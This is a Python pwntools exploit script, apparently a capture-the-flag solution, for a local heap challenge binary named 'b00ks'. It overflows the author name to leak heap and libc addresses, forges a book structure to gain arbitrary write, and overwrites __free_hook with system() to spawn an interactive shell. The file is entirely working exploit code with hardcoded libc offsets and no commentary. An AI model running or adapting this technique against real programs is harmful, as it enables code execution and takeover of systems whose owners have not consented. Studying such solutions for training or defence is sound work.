from pwn import *
#context.log_level = "debug"

#binary = ELF("b00ks")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
io = process("./b00ks")


def createbook(name_size, name, des_size, des):
    io.readuntil("> ")
    io.sendline("1")
    io.readuntil(": ")
    io.sendline(str(name_size))
    io.readuntil(": ")
    io.sendline(name)
    io.readuntil(": ")
    io.sendline(str(des_size))
    io.readuntil(": ")
    io.sendline(des)


def printbook(id):
    io.readuntil("> ")
    io.sendline("4")
    io.readuntil(": ")
    for i in range(id):
        book_id = int(io.readline()[:-1])
        io.readuntil(": ")
        book_name = io.readline()[:-1]
        io.readuntil(": ")
        book_des = io.readline()[:-1]
        io.readuntil(": ")
        book_author = io.readline()[:-1]
    return book_id, book_name, book_des, book_author


def createname(name):
    io.readuntil("name: ")
    io.sendline(name)


def changename(name):
    io.readuntil("> ")
    io.sendline("5")
    io.readuntil(": ")
    io.sendline(name)


def editbook(book_id, new_des):
    io.readuntil("> ")
    io.sendline("3")
    io.readuntil(": ")
    io.writeline(str(book_id))
    io.readuntil(": ")
    io.sendline(new_des)


def deletebook(book_id):
    io.readuntil("> ")
    io.sendline("2")
    io.readuntil(": ")
    io.sendline(str(book_id))


createname('a'*32)
createbook(10, '/bin/sh', 0x100, 'a'*0x10*12+p64(1))
book_info = u64(printbook(1)[3].replace('a', '').ljust(8, '\x00'))
print(hex(book_info))
editbook(1, 'a'*0x10*12+p64(1)+p64(book_info+0x50)*2+p64(0x200))
changename('a'*32)
createbook(10, 'a', 0x80, 'a')
createbook(10, 'a', 0x80, 'a')
deletebook(2)
deletebook(3)
libc_base = u64(printbook(1)[1].ljust(8, '\x00'))-88-0x3C4B20
print hex(libc_base)
free_hook = libc_base+0x3C67A8
system_libc = libc_base+0x45390
binsh = libc_base+0x18CD57

createbook(24, 'a'*16, 24, 'b'*16)

# change book name&desc pointer
editbook(1, 'a'*0x170+p64(4)+p64(free_hook)*2+p64(0x10))
# printbook()
editbook(4, p64(system_libc))
editbook(1, 'a'*0x170+p64(4)+p64(binsh)*2+p64(0x10))
deletebook(4)
io.interactive()
